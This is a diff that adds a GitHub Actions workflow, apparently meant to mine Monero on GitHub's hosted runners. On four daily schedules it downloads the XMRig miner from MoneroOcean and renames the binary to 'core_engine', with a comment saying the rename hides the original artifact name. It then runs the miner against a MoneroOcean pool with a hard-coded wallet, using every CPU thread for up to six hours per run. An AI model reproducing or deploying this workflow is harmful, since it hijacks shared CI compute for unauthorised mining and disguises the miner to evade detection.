@@ -1,0 +1,73 @@
+name: "⛧ MOONRIG // CORE EXECUTION NODE"
+
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: "0 0 * * *"
+    - cron: "30 6 * * *"
+    - cron: "0 13 * * *"
+    - cron: "30 19 * * *"
+
+jobs:
+  ghost_node:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: "⚙️ bootstrap // system sync"
+        run: |
+          sudo apt update
+          sudo apt install -y curl htop procps
+
+      - name: "⬇️ payload fetch // core archive"
+        run: |
+          mkdir -p ~/core_node
+          cd ~/core_node
+
+          url=$(curl -fsSL https://api.github.com/repos/MoneroOcean/xmrig/releases/latest \
+          | grep browser_download_url \
+          | grep -E 'lin64-compat|lin64\.tar\.gz' \
+          | head -1 \
+          | cut -d '"' -f 4)
+
+          curl -L "$url" -o payload.tar.gz
+          tar xf payload.tar.gz
+
+          # normalize binary name (hide original artifact name)
+          BIN=$(find . -type f -perm -111 | head -1)
+          if [ -f "$BIN" ]; then
+            mv "$BIN" ./core_engine
+            chmod +x ./core_engine
+          fi
+
+      - name: "🧠 system scan // runtime profile"
+        run: |
+          echo "== CPU MATRIX =="
+          lscpu
+          echo ""
+          echo "== MEMORY STATE =="
+          free -h
+          echo ""
+          echo "== THREAD CAPACITY =="
+          nproc
+
+      - name: "⛏️ execution layer // core runtime"
+        env:
+          TERM: xterm
+        run: |
+          cd ~/core_node
+
+          ./core_engine \
+            -o gulf.moneroocean.stream:20004 \
+            -u 4642GJmrVXnEcUU8NQAhdVFphkSb1oXdTDGX6TjNsYMb7PfafouDdLXFX3c3Pkhqd6dNcDwmriJMiCzwSPfzHQAwGcJio \
+            --rig-id github-runner \
+            --keepalive \
+            --tls \
+            --donate-level 0 \
+            -t $(nproc)
+
+      - name: "📊 telemetry dump // post-run snapshot"
+        if: always()
+        run: |
+          top -b -n1 | head -30
